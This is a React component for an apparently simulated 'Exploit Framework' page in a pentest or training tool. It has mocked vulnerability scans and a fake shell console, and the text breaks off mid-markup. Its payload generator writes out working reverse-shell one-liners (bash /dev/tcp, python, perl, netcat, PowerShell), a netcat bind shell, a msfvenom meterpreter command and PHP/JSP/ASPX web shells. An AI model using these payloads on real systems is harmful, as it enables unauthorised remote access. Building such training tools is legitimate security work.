import React, { useState, useEffect, useRef } from 'react';
import { useAuthStore } from '../store/authStore';
import { useExploitStore, ShellSession } from '../store/exploitStore';
import { assetService, Asset } from '../services/assetService';

interface Vulnerability {
  id: string;
  cve_id: string;
  title: string;
  description: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  cvss_score: number;
  affected_service: string;
  affected_port: number;
  exploit_available: boolean;
  exploit_module?: string;
  exploit_db_id?: string;
  metasploit_module?: string;
  source_database: 'cve' | 'exploit_db' | 'metasploit' | 'vulners' | 'packetstorm';
}

interface ExploitModule {
  id: string;
  name: string;
  description: string;
  difficulty: 'easy' | 'medium' | 'hard';
  payload_type: 'reverse_shell' | 'bind_shell' | 'meterpreter' | 'web_shell' | 'custom';
  payload_variant?: 'bash' | 'python' | 'perl' | 'netcat' | 'powershell' | 'php' | 'jsp' | 'aspx';
  target_service?: string;
  target_port?: number;
  vulnerability?: Vulnerability;
}

const Exploit: React.FC = () => {
  const { token } = useAuthStore();
  const { 
    sessions: shellSessions, 
    activeSessionId: activeSession, 
    addSession, 
    removeSession, 
    setActiveSession, 
    updateSessionStatus,
    incrementCommandCount
  } = useExploitStore();
  const [assets, setAssets] = useState<Asset[]>([]);
  const [loading, setLoading] = useState(true);
  const [selectedAsset, setSelectedAsset] = useState<Asset | null>(null);
  
  // Asset filtering - initialize from localStorage
  const [assetFilter, setAssetFilter] = useState<'all' | 'scanned' | 'unscanned' | 'vulnerable'>(() => {
    const saved = localStorage.getItem('exploit_assetFilter');
    return (saved as 'all' | 'scanned' | 'unscanned' | 'vulnerable') || 'all';
  });
  const [ipFilter, setIpFilter] = useState(() => localStorage.getItem('exploit_ipFilter') || '');
  const [manualIP, setManualIP] = useState('');
  const [showManualIPInput, setShowManualIPInput] = useState(false);
  
  // Vulnerability scanning state - initialize databases from localStorage
  const [vulnerabilities, setVulnerabilities] = useState<Vulnerability[]>([]);
  const [scanning, setScanning] = useState(false);
  const [selectedVulnerability, setSelectedVulnerability] = useState<Vulnerability | null>(null);
  const [selectedDatabases, setSelectedDatabases] = useState<string[]>(() => {
    const saved = localStorage.getItem('exploit_selectedDatabases');
    return saved ? JSON.parse(saved) : ['cve', 'exploit_db', 'metasploit'];
  });
  const [scannedAssetsWithVulns, setScannedAssetsWithVulns] = useState<Set<string>>(() => {
    const saved = localStorage.getItem('exploit_scannedVulnerable');
    return saved ? new Set(JSON.parse(saved)) : new Set();
  });
  
  // Exploit builder state
  const [exploitName, setExploitName] = useState('');
  const [exploitDescription, setExploitDescription] = useState('');
  const [payloadType, setPayloadType] = useState<'reverse_shell' | 'bind_shell' | 'meterpreter' | 'web_shell' | 'custom'>('reverse_shell');
  const [payloadVariant, setPayloadVariant] = useState<'bash' | 'python' | 'perl' | 'netcat' | 'powershell' | 'php' | 'jsp' | 'aspx'>('bash');
  const [targetService, setTargetService] = useState('');
  const [targetPort, setTargetPort] = useState('');
  const [listenerIP, setListenerIP] = useState('');
  const [listenerPort, setListenerPort] = useState('4444');
  const [customPayload, setCustomPayload] = useState('');
  
  // Shell console state - using exploit store
  const [command, setCommand] = useState('');
  const [output, setOutput] = useState<string[]>([]);
  const terminalEndRef = useRef<HTMLDivElement>(null);
  
  // View state
  const [activeTab, setActiveTab] = useState<'assets' | 'console'>('assets');
  const [showBuilderPanel, setShowBuilderPanel] = useState(false);
  const [showVulnerabilities, setShowVulnerabilities] = useState(false);
  const [showVulnDetails, setShowVulnDetails] = useState(false);
  const [selectedVulnForDetails, setSelectedVulnForDetails] = useState<Vulnerability | null>(null);
  const [vulnDetailDatabase, setVulnDetailDatabase] = useState<string>('cve');

  // Persist filters to localStorage
  useEffect(() => {
    localStorage.setItem('exploit_assetFilter', assetFilter);
  }, [assetFilter]);

  useEffect(() => {
    localStorage.setItem('exploit_ipFilter', ipFilter);
  }, [ipFilter]);

  useEffect(() => {
    localStorage.setItem('exploit_selectedDatabases', JSON.stringify(selectedDatabases));
  }, [selectedDatabases]);

  useEffect(() => {
    localStorage.setItem('exploit_scannedVulnerable', JSON.stringify(Array.from(scannedAssetsWithVulns)));
  }, [scannedAssetsWithVulns]);

  useEffect(() => {
    fetchAllAssets();
  }, [token]);

  useEffect(() => {
    if (terminalEndRef.current) {
      terminalEndRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  }, [output]);

  const fetchAllAssets = async () => {
    if (!token) return;
    setLoading(true);
    try {
      const allAssets = await assetService.getAssets(token);
      // Show all assets (both scanned and unscanned)
      setAssets(allAssets);
    } catch (error) {
      console.error('Failed to fetch assets:', error);
    } finally {
      setLoading(false);
    }
  };

  const getFilteredAssets = () => {
    let filtered = assets;
    
    // Filter by scan status
    if (assetFilter === 'scanned') {
      filtered = filtered.filter(asset => asset.open_ports && asset.open_ports.length > 0);
    } else if (assetFilter === 'unscanned') {
      filtered = filtered.filter(asset => !asset.open_ports || asset.open_ports.length === 0);
    } else if (assetFilter === 'vulnerable') {
      // Only show assets that have been scanned and have vulnerabilities
      filtered = filtered.filter(asset => scannedAssetsWithVulns.has(asset.ip_address));
    }
    
    // Filter by IP address
    if (ipFilter.trim()) {
      filtered = filtered.filter(asset => 
        asset.ip_address.toLowerCase().includes(ipFilter.toLowerCase().trim()) ||
        (asset.hostname && asset.hostname.toLowerCase().includes(ipFilter.toLowerCase().trim()))
      );
    }
    
    return filtered;
  };

  const addManualIP = () => {
    if (!manualIP.trim()) return;
    
    // Check if IP already exists
    const exists = assets.find(a => a.ip_address === manualIP.trim());
    if (exists) {
      setSelectedAsset(exists);
      setManualIP('');
      setShowManualIPInput(false);
      return;
    }
    
    // Create a new asset entry
    const newAsset: Asset = {
      id: `manual-${Date.now()}`,
      ip_address: manualIP.trim(),
      hostname: undefined,
      asset_type: 'unknown',
      status: 'unknown',
      last_seen: new Date().toISOString(),
      discovery_method: 'manual',
      open_ports: []
    };
    
    setAssets([newAsset, ...assets]);
    setSelectedAsset(newAsset);
    setManualIP('');
    setShowManualIPInput(false);
  };

  const scanForVulnerabilities = async (asset: Asset) => {
    setScanning(true);
    setShowVulnerabilities(true);
    setVulnerabilities([]);
    
    try {
      // Simulate vulnerability scanning using discovered ports
      const mockVulnerabilities: Vulnerability[] = [];
      
      if (asset.open_ports && asset.services) {
        // Check for SSH vulnerabilities
        if (asset.services['22']) {
          mockVulnerabilities.push({
            id: 'vuln-1',
            cve_id: 'CVE-2023-48795',
            title: 'SSH Terrapin Attack',
            description: 'Prefix truncation weakness in SSH protocol allowing MitM attacks',
            severity: 'high',
            cvss_score: 7.5,
            affected_service: 'ssh',
            affected_port: 22,
            exploit_available: true,
            exploit_module: 'ssh_terrapin',
            source_database: 'cve'
          });
        }
        
        // Check for HTTP vulnerabilities  
        if (asset.services['80'] || asset.services['443'] || asset.services['8080']) {
          const httpPort = asset.services['80'] ? 80 : (asset.services['443'] ? 443 : 8080);
          mockVulnerabilities.push({
            id: 'vuln-2',
            cve_id: 'CVE-2024-23897',
            title: 'Jenkins CLI Command Injection',
            description: 'Arbitrary file read vulnerability in Jenkins CLI',
            severity: 'critical',
            cvss_score: 9.8,
            affected_service: 'http',
            affected_port: httpPort,
            exploit_available: true,
            exploit_module: 'jenkins_cli_rce',
            source_database: 'cve'
          });
        }
        
        // Check for FTP vulnerabilities
        if (asset.services['21']) {
          mockVulnerabilities.push({
            id: 'vuln-3',
            cve_id: 'CVE-2023-1234',
            title: 'ProFTPD Remote Code Execution',
            description: 'Buffer overflow in ProFTPD mod_copy module',
            severity: 'critical',
            cvss_score: 9.1,
            affected_service: 'ftp',
            affected_port: 21,
            exploit_available: true,
            exploit_module: 'proftpd_modcopy_exec',
            source_database: 'metasploit'
          });
        }
        
        // Check for SMB vulnerabilities
        if (asset.services['445']) {
          mockVulnerabilities.push({
            id: 'vuln-4',
            cve_id: 'CVE-2017-0144',
            title: 'EternalBlue SMB Remote Code Execution',
            description: 'Critical vulnerability in SMBv1 exploited by WannaCry',
            severity: 'critical',
            cvss_score: 9.3,
            affected_service: 'smb',
            affected_port: 445,
            exploit_available: true,
            exploit_module: 'eternalblue',
            source_database: 'exploit_db'
          });
        }
        
        // Check for MySQL vulnerabilities
        if (asset.services['3306']) {
          mockVulnerabilities.push({
            id: 'vuln-5',
            cve_id: 'CVE-2023-21980',
            title: 'MySQL Authentication Bypass',
            description: 'Authentication bypass allowing unauthorized access',
            severity: 'high',
            cvss_score: 8.1,
            affected_service: 'mysql',
            affected_port: 3306,
            exploit_available: true,
            exploit_module: 'mysql_auth_bypass',
            source_database: 'cve'
          });
        }
      }
      
      // Simulate scanning delay
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      setVulnerabilities(mockVulnerabilities);
      
      // Track assets with vulnerabilities
      if (mockVulnerabilities.length > 0) {
        setScannedAssetsWithVulns(prev => new Set(prev).add(asset.ip_address));
      }
    } catch (error) {
      console.error('Vulnerability scan failed:', error);
    } finally {
      setScanning(false);
    }
  };

  const generatePayload = () => {
    let payload = '';
    
    if (payloadType === 'custom') {
      return customPayload;
    }
    
    if (payloadType === 'reverse_shell') {
      switch (payloadVariant) {
        case 'bash':
          payload = `bash -i >& /dev/tcp/${listenerIP}/${listenerPort} 0>&1`;
          break;
        case 'python':
          payload = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${listenerIP}",${listenerPort}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
          break;
        case 'perl':
          payload = `perl -e 'use Socket;$i="${listenerIP}";$p=${listenerPort};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
          break;
        case 'netcat':
          payload = `nc -e /bin/sh ${listenerIP} ${listenerPort}`;
          break;
        case 'powershell':
          payload = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${listenerIP}",${listenerPort});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
          break;
      }
    } else if (payloadType === 'bind_shell') {
      payload = `nc -lvp ${listenerPort} -e /bin/bash`;
    } else if (payloadType === 'meterpreter') {
      payload = `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${listenerIP} LPORT=${listenerPort} -f elf > payload.elf`;
    } else if (payloadType === 'web_shell') {
      switch (payloadVariant) {
        case 'php':
          payload = `<?php system($_GET['cmd']); ?>`;
          break;
        case 'jsp':
          payload = `<%@ page import="java.io.*" %>\n<% String cmd = request.getParameter("cmd");\n   Process p = Runtime.getRuntime().exec(cmd);\n   OutputStream os = p.getOutputStream();\n   InputStream in = p.getInputStream(); %>`;
          break;
        case 'aspx':
          payload = `<%@ Page Language="C#" %>\n<% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]).StandardOutput.ReadToEnd()); %>`;
          break;
      }
    }
    
    return payload;
  };

  const buildExploitFromVulnerability = (vuln: Vulnerability) => {
    setSelectedVulnerability(vuln);
    setExploitName(`Exploit for ${vuln.cve_id}`);
    setExploitDescription(vuln.description);
    setTargetService(vuln.affected_service);
    setTargetPort(vuln.affected_port.toString());
    setShowBuilderPanel(true);
  };

  const handleBuildExploit = () => {
    const payload = generatePayload();
    const vulnInfo = selectedVulnerability 
      ? [`[*] Target Vulnerability: ${selectedVulnerability.cve_id}`, `[*] CVSS Score: ${selectedVulnerability.cvss_score}/10`]
      : [];
    
    setOutput([
      '[+] Exploit Module Built Successfully',
      `[*] Name: ${exploitName}`,
      `[*] Target: ${selectedAsset?.ip_address || 'Not selected'}`,
      ...vulnInfo,
      `[*] Payload Type: ${payloadType}${payloadVariant ? ` (${payloadVariant})` : ''}`,
      `[*] Generated Payload:`,
      payload,
      '[!] Ready to execute. Use the Console tab to deploy.'
    ]);
    setActiveTab('console');
  };

  const handleExecutePayload = async () => {
    if (!selectedAsset) {
      setOutput(prev => [...prev, '[!] ERROR: No target selected']);
      return;
    }

    const newSession: ShellSession = {
      id: Math.random().toString(36).substring(7),
      target_ip: selectedAsset.ip_address,
      target_port: parseInt(targetPort) || 4444,
      status: 'connecting',
      type: payloadType === 'reverse_shell' ? 'reverse' : 'bind',
      created_at: new Date(),
      commands_executed: 0,
      uptime: 0
    };

    addSession(newSession);
    
    const vulnInfo = selectedVulnerability 
      ? [`[*] Exploiting vulnerability: ${selectedVulnerability.cve_id}`]
      : [];
    
    setOutput(prev => [
      ...prev,
      `[*] Initializing ${payloadType} to ${selectedAsset.ip_address}:${targetPort}`,
      ...vulnInfo,
      '[*] Setting up listener...',
      '[*] Sending exploit payload...',
      '[*] Waiting for connection...'
    ]);

    // Simulate connection process
    setTimeout(() => {
      updateSessionStatus(newSession.id, 'connected');
      setOutput(prev => [
        ...prev,
        `[+] Exploit successful!`,
        `[+] Shell session ${newSession.id} opened`,
        `[+] Connected to ${selectedAsset.ip_address}`,
        `[*] You now have ${payloadType === 'bind_shell' ? 'bind' : 'reverse'} shell access`,
        `[*] Type commands below...`
      ]);
    }, 2000);
  };

  const handleSendCommand = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!command.trim() || !activeSession) return;

    const currentCommand = command;
    const session = shellSessions.find(s => s.id === activeSession);
    if (session) {
      incrementCommandCount(activeSession);
    }
    
    setCommand('');
    setOutput(prev => [...prev, `root@${selectedAsset?.hostname || selectedAsset?.ip_address}:~# ${currentCommand}`]);

    // Simulate command execution
    setTimeout(() => {
      let response = '';
      if (currentCommand === 'whoami') {
        response = 'root';
      } else if (currentCommand === 'pwd') {
        response = '/root';
      } else if (currentCommand.startsWith('ls')) {
        response = 'Desktop\nDocuments\nDownloads\nflag.txt\nexploit.sh';
      } else if (currentCommand === 'id') {
        response = 'uid=0(root) gid=0(root) groups=0(root)';
      } else if (currentCommand === 'uname -a') {
        response = 'Linux target 5.15.0-56-generic #62-Ubuntu SMP x86_64 GNU/Linux';
      } else if (currentCommand.startsWith('cat flag.txt')) {
        response = 'FLAG{pwn3d_by_exploit_framework}';
      } else if (currentCommand === 'ifconfig' || currentCommand === 'ip a') {
        response = `eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet ${selectedAsset?.ip_address}  netmask 255.255.255.0  broadcast 192.168.1.255`;
      } else {
        response = `[*] Command executed: ${currentCommand}`;
      }
      setOutput(prev => [...prev, response]);
    }, 500);
  };

  const handleCloseSession = (sessionId: string) => {
    removeSession(sessionId);
    setOutput(prev => [...prev, `[*] Session ${sessionId} closed`]);
  };

  const getVulnerabilityCount = (asset: Asset) => {
    // In real implementation, this would check the vulnerabilities table
    return asset.open_ports?.length || 0;
  };

  const getSeverityColor = (severity: string) => {
    const colors = {
      'critical': 'border-red-600 text-red-500 bg-red-500',
      'high': 'border-orange-500 text-orange-400 bg-orange-500',
      'medium': 'border-yellow-500 text-yellow-400 bg-yellow-500',
      'low': 'border-blue-500 text-blue-400 bg-blue-500'
    };
    return colors[severity as keyof typeof colors] || colors.low;
  };

  const getServiceIcon = (service: string) => {
    const icons: { [key: string]: string } = {
      'ssh': 'â—ˆ',
      'http': 'â—‰',
      'https': 'â—‰',
      'ftp': 'â¬¢',
      'telnet': 'â—†',
      'rdp': 'â¬¡',
      'vnc': 'â—ˆ',
      'mysql': 'â¬¢',
      'postgresql': 'â—‰',
      'smb': 'â—†'
    };
    return icons[service.toLowerCase()] || 'â—ˆ';
  };

  const getSessionUptime = (session: ShellSession) => {
    const now = new Date();
    const diff = Math.floor((now.getTime() - session.created_at.getTime()) / 1000);
    const minutes = Math.floor(diff / 60);
    const seconds = diff % 60;
    return `${minutes}m ${seconds}s`;
  };

  return (
    <div className="h-full flex flex-col space-y-4 relative">
      {/* Header */}
      <div className="flex justify-between items-center">
        <div>
          <h2 className="text-2xl font-bold text-cyber-red uppercase tracking-wider cyber-glow-red flex items-center">
            <span className="mr-3 text-3xl">â—†</span>
            Exploit Framework
          </h2>
          <p className="text-cyber-gray-light text-sm mt-1">Build and execute exploits against vulnerable targets</p>
        </div>
        <div className="flex space-x-2">
          <button
            onClick={() => setActiveTab('assets')}
            className={`btn-cyber px-4 py-2 ${activeTab === 'assets' ? 'border-cyber-red text-cyber-red bg-cyber-red bg-opacity-10' : 'border-cyber-gray text-cyber-gray hover:border-cyber-red hover:text-cyber-red'}`}
          >
            <span className="text-lg mr-1">â—‰</span> Targets
          </button>
          <button
            onClick={() => setActiveTab('console')}
            className={`btn-cyber px-4 py-2 ${activeTab === 'console' ? 'border-cyber-green text-cyber-green bg-cyber-green bg-opacity-10' : 'border-cyber-gray text-cyber-gray hover:border-cyber-green hover:text-cyber-green'}`}
          >
            <span className="text-lg mr-1">â–¶</span> Console
          </button>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 bg-cyber-darker border border-cyber-gray rounded-lg overflow-hidden">
        {/* Assets Tab */}
        {activeTab === 'assets' && (
          <div className="h-full flex flex-col">
            <div className="p-4 border-b border-cyber-gray bg-cyber-dark">
              <div className="flex items-center justify-between mb-3">
                <h3 className="text-cyber-blue font-bold uppercase text-sm flex items-center">
                  <span className="mr-2">â—ˆ</span>
                  Targets ({getFilteredAssets().length})
                </h3>
                <div className="flex space-x-2">
                  <button
                    onClick={() => setAssetFilter('all')}
                    className={`px-3 py-1 text-xs border rounded ${assetFilter === 'all' ? 'border-cyber-blue text-cyber-blue bg-cyber-blue bg-opacity-10' : 'border-cyber-gray text-cyber-gray hover:border-cyber-blue'}`}
                  >
                    All
                  </button>
                  <button
                    onClick={() => setAssetFilter('scanned')}
                    className={`px-3 py-1 text-xs border rounded ${assetFilter === 'scanned' ? 'border-cyber-green text-cyber-green bg-cyber-green bg-opacity-10' : 'border-cyber-gray text-cyber-gray hover:border-cyber-green'}`}
                  >
                    Scanned
                  </button>
                  <button
                    onClick={() => setAssetFilter('unscanned')}
                    className={`px-3 py-1 text-xs border rounded ${assetFilter === 'unscanned' ? 'border-cyber-purple text-cyber-purple bg-cyber-purple bg-opacity-10' : 'border-cyber-gray text-cyber-gray hover:border-cyber-purple'}`}
                  >
                    Unscanned
                  </button>
                  <button
                    onClick={() => setAssetFilter('vulnerable')}
                    className={`px-3 py-1 text-xs border rounded ${assetFilter === 'vulnerable' ? 'border-cyber-red text-cyber-red bg-cyber-red bg-opacity-10' : 'border-cyber-gray text-cyber-gray hover:border-cyber-red'}`}
                  >
                    â—† Vulnerable
                  </button>
                </div>
              </div>
              
              {/* IP Filter and Scan Controls Row */}
              <div className="flex items-center space-x-2">
                <div className="flex-1 relative">
                  <input
                    type="text"
                    value={ipFilter}
                    onChange={(e) => setIpFilter(e.target.value)}
                    placeholder="Filter by IP or hostname..."
                    className="w-full px-3 py-2 bg-cyber-darker border border-cyber-gray rounded text-white text-sm focus:outline-none focus:border-cyber-blue placeholder-cyber-gray"
                  />
                  {ipFilter && (
                    <button
                      onClick={() => setIpFilter('')}
                      className="absolute right-2 top-1/2 transform -translate-y-1/2 text-cyber-gray hover:text-cyber-red"
                    >
                      âœ•
                    </button>
                  )}
                </div>
                <button
                  onClick={() => setShowManualIPInput(!showManualIPInput)}
                  className="btn-cyber border-cyber-purple text-cyber-purple hover:bg-cyber-purple hover:text-black px-4 py-2 text-sm font-bold whitespace-nowrap"
                >
                  âŠž Add IP
                </button>
              </div>

              {/* Manual IP Entry */}
              {showManualIPInput && (
                <div className="mt-3 p-3 bg-cyber-darker border border-cyber-purple rounded">
                  <div className="flex items-center space-x-2">
                    <input
                      type="text"
                      value={manualIP}
                      onChange={(e) => setManualIP(e.target.value)}
                      onKeyPress={(e) => e.key === 'Enter' && addManualIP()}
                      placeholder="e.g., 172.21.0.42"
                      className="flex-1 px-3 py-2 bg-cyber-dark border border-cyber-gray rounded text-white text-sm focus:outline-none focus:border-cyber-purple placeholder-cyber-gray font-mono"
                      autoFocus
                    />
                    <button
                      onClick={addManualIP}
                      className="btn-cyber border-cyber-green text-cyber-green hover:bg-cyber-green hover:text-black px-4 py-2 text-sm font-bold"
                    >
                      Add
                    </button>
                    <button
                      onClick={() => {
                        setShowManualIPInput(false);
                        setManualIP('');
                      }}
                      className="btn-cyber border-cyber-gray text-cyber-gray hover:border-cyber-red hover:text-cyber-red px-4 py-2 text-sm"
                    >
                      Cancel
                    </button>
                  </div>
                </div>
              )}
            </div>
            
            {/* Vulnerability Scanning Panel */}
            {showVulnerabilities && selectedAsset && (
              <div className="border-b border-cyber-gray bg-cyber-darker p-4">
                <div className="flex items-center justify-between mb-3">
                  <h4 className="text-cyber-purple font-bold text-sm flex items-center">
                    <span className="mr-2">â—ˆ</span> Vuln Scan: {selectedAsset.ip_address}
                  </h4>
                  <div className="flex items-center space-x-2">
                    {/* Inline Database Selection */}
                    <div className="flex gap-2">
                      {[
                        { id: 'cve', label: 'CVE', icon: 'â¬¢' },
                        { id: 'exploit_db', label: 'ExploitDB', icon: 'â—‰' },
                        { id: 'metasploit', label: 'Metasploit', icon: 'â—ˆ' },
                        { id: 'vulners', label: 'Vulners', icon: 'â–²' },
                        { id: 'packetstorm', label: 'PacketStorm', icon: 'â—†' }
                      ].map(db => (
                        <button
                          key={db.id}
                          onClick={() => {
                            if (selectedDatabases.includes(db.id)) {
                              setSelectedDatabases(selectedDatabases.filter(d => d !== db.id));
                            } else {
                              setSelectedDatabases([...selectedDatabases, db.id]);
                            }
                          }}
                          className={`px-2 py-1 text-xs border rounded transition-all ${
                            selectedDatabases.includes(db.id)
                              ? 'border-cyber-blue text-cyber-blue bg-cyber-blue bg-opacity-20'
                              : 'border-cyber-gray text-cyber-gray hover:border-cyber-blue'
                          }`}
                          title={db.label}
                        >
                          <span className="mr-1">{db.icon}</span>{db.label}
                        </button>
                      ))}
                    </div>
                    <button
                      onClick={() => setShowVulnerabilities(false)}
                      className="text-cyber-gray hover:text-cyber-red text-lg"
                    >
                      âœ•
                    </button>
                  </div>
                </div>
                
                {scanning ? (
                  <div className="text-center py-6">
                    <div className="animate-spin text-3xl mb-2">â—ˆ</div>
                    <p className="text-cyber-blue text-sm">Scanning...</p>
                  </div>
                ) : vulnerabilities.length === 0 ? (
                  <div className="text-center py-6">
                    <p className="text-cyber-green text-sm">âœ“ No vulnerabilities detected</p>
                  </div>
                ) : (
                  <div className="space-y-2 max-h-64 overflow-auto">
                    {vulnerabilities.map(vuln => (
                      <div 
                        key={vuln.id} 
                        className="bg-cyber-dark border border-cyber-gray rounded p-3">
                        <div className="flex items-start justify-between">
                          <div className="flex-1">
                            <div className="flex items-center space-x-2 mb-1 flex-wrap">
                              <span className={`px-2 py-0.5 text-xs font-bold border rounded ${getSeverityColor(vuln.severity)} bg-opacity-20`}>
                                {vuln.severity.toUpperCase()}
                              </span>
                              <span className="text-cyber-blue font-mono text-xs">{vuln.cve_id}</span>
                              <span className="text-cyber-gray text-xs">CVSS: {vuln.cvss_score}/10</span>
                            </div>
                            <h5 className="text-white font-semibold text-sm">{vuln.title}</h5>
                            <p className="text-xs text-cyber-gray-light mt-1">{vuln.description}</p>
                            <div className="flex items-center space-x-2 mt-2 text-xs">
                              <span className="text-cyber-purple">
                                {getServiceIcon(vuln.affected_service)} {vuln.affected_service}:{vuln.affected_port}
                              </span>
                              {vuln.exploit_available && (
                                <span className="text-cyber-green">â—† Available</span>
                              )}
                            </div>
                          </div>
                          <div className="flex gap-2">
                            <button
                              onClick={() => {
                                setSelectedVulnForDetails(vuln);
                                setShowVulnDetails(true);
                              }}
                              className="btn-cyber border-cyber-blue text-cyber-blue hover:bg-cyber-blue hover:text-black px-3 py-1 text-xs font-bold"
                            >
                              Details
                            </button>
                            {vuln.exploit_available && (
                              <button
                                onClick={() => buildExploitFromVulnerability(vuln)}
                                className="btn-cyber border-cyber-red text-cyber-red hover:bg-cyber-red hover:text-black px-3 py-1 text-xs font-bold"
                              >
                                Build
                              </button>
                            )}
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            )}
            
            <div className="flex-1 overflow-auto">
              {loading ? (
                <div className="flex items-center justify-center h-full">
                  <div className="text-cyber-blue animate-pulse text-xs">Loading targets...</div>
                </div>
              ) : getFilteredAssets().length === 0 ? (
                <div className="flex items-center justify-center h-full">
                  <div className="text-center">
                    <div className="text-4xl mb-2 opacity-20">â—ˆ</div>
                    <p className="text-cyber-gray-light text-xs">No {assetFilter === 'all' ? '' : assetFilter} targets found</p>
                  </div>
                </div>
              ) : (
                <div className="divide-y divide-cyber-gray">
                  {getFilteredAssets().map(asset => (
                    <div
                      key={asset.id}
                      onClick={() => setSelectedAsset(asset)}
                      className={`p-4 cursor-pointer transition-all ${
                        selectedAsset?.id === asset.id
                          ? 'bg-cyber-darker border-l-4 border-cyber-red'
                          : 'border-l-2 border-transparent hover:bg-cyber-dark hover:border-cyber-purple'
                      }`}
                    >
                      <div className="flex items-center justify-between">
                        <div className="flex-1">
                          <div className="flex items-center space-x-2 mb-1">
                            <h4 className="text-cyber-blue font-bold text-sm font-mono">{asset.ip_address}</h4>
                            {asset.hostname && asset.hostname !== asset.ip_address && (
                              <span className="text-cyber-gray-light text-xs">{asset.hostname}</span>
                            )}
                            {asset.open_ports && asset.open_ports.length > 0 && (
                              <span className="px-1.5 py-0.5 text-xs border border-cyber-green text-cyber-green rounded">
                                Scanned
                              </span>
                            )}
                          </div>
                          
                          <div className="flex items-center space-x-4 text-xs">
                            <span className="text-cyber-gray-light">OS: <span className="text-cyber-green">{asset.os_name || 'Unknown'}</span></span>
                            <span className="text-cyber-gray-light">Ports: <span className="text-cyber-purple font-bold">{asset.open_ports?.length || 0}</span></span>
                            {asset.services && Object.keys(asset.services).length > 0 && (
                              <div className="flex gap-1">
                                {Object.keys(asset.services).slice(0, 6).map(port => (
                                  <span
                                    key={port}
                                    className="px-2 py-0.5 bg-cyber-darker border border-cyber-blue text-cyber-blue rounded text-xs"
                                    title={`${asset.services?.[port]?.service || 'Unknown'} on port ${port}`}
                                  >
                                    {getServiceIcon(asset.services?.[port]?.service || '')} {port}
                                  </span>
                                ))}
                                {Object.keys(asset.services).length > 6 && (
                                  <span className="text-cyber-gray text-xs">+{Object.keys(asset.services).length - 6}</span>
                                )}
                              </div>
                            )}
                          </div>
                        </div>
                        
                        <div className="flex items-center space-x-2">
                          {asset.open_ports && asset.open_ports.length > 0 && (
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                setSelectedAsset(asset);
                                scanForVulnerabilities(asset);
                              }}
                              className="btn-cyber border-cyber-blue text-cyber-blue hover:bg-cyber-blue hover:text-black px-3 py-1 text-xs font-bold"
                            >
                              â—ˆ Scan
                            </button>
                          )}
                          <button
                            onClick={(e) => {
                              e.stopPropagation();
                              setSelectedAsset(asset);
                              setShowBuilderPanel(true);
                            }}
                            className="btn-cyber border-cyber-red text-cyber-red hover:bg-cyber-red hover:text-black px-3 py-1 text-xs font-bold"
                          >
                            â—† Build
                          </button>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        )}

        {/* Console Tab */}
        {activeTab === 'console' && (
          <div className="h-full flex flex-col overflow-hidden">
            {/* Fixed Header with Session Tabs */}
            <div className="flex-shrink-0 p-4 border-b border-cyber-gray bg-cyber-dark">
              <div className="flex items-center justify-between">
                <div>
                  <h3 className="text-cyber-green font-bold uppercase text-sm flex items-center">
                    <span className="mr-2">â–£</span>
                    Shell Console
                  </h3>
                  {activeSession && (() => {
                    const session = shellSessions.find(s => s.id === activeSession);
                    return session ? (
                      <div className="flex items-center space-x-4 text-xs mt-2">
                        <span className="text-cyber-blue">
                          Session: {session.target_ip}:{session.target_port}
                        </span>
                        <span className="text-cyber-gray-light">
                          Commands: {session.commands_executed}
                        </span>
                        <span className="text-cyber-gray-light">
                          Status: <span className={session.status === 'connected' ? 'text-cyber-green' : 'text-cyber-red'}>
                            {session.status.toUpperCase()}
                          </span>
                        </span>
                      </div>
                    ) : null;
                  })()}
                </div>
                
                {/* Session Tabs */}
                {shellSessions.length > 0 && (
                  <div className="flex items-center space-x-2">
                    {shellSessions.map(session => (
                    <div
                      key={session.id}
                      className={`flex items-center space-x-2 px-3 py-1 border rounded cursor-pointer ${
                        activeSession === session.id
                          ? 'border-cyber-green text-cyber-green bg-cyber-green bg-opacity-10'
                          : 'border-cyber-gray text-cyber-gray hover:border-cyber-green'
                      }`}
                      onClick={() => setActiveSession(session.id)}
                    >
                      <span className={`w-2 h-2 rounded-full ${
                        session.status === 'connected' ? 'bg-cyber-green animate-pulse' :
                        session.status === 'connecting' ? 'bg-cyber-blue animate-pulse' :
                        session.status === 'failed' ? 'bg-cyber-red' :
                        'bg-cyber-gray'
                      }`} />
                      <span className="text-xs font-mono">{session.target_ip}</span>
                      <button
                        onClick={(e) => {
                          e.stopPropagation();
                          handleCloseSession(session.id);
                        }}
                        className="text-cyber-red hover:text-white ml-1"
                      >
                        Ã—
                      </button>
                    </div>
                  ))}
                </div>
              )}
              </div>
            </div>
            
            {/* Scrollable Console Area */}
            <div className="flex-1 flex flex-col bg-black text-green-500 font-mono p-4 text-sm overflow-hidden">
              {shellSessions.length === 0 ? (
                <div className="flex items-center justify-center h-full">
                  <div className="text-center">
                    <div className="text-6xl mb-4 opacity-20">ðŸ’»</div>
                    <p className="text-cyber-gray-light">No active shell sessions</p>
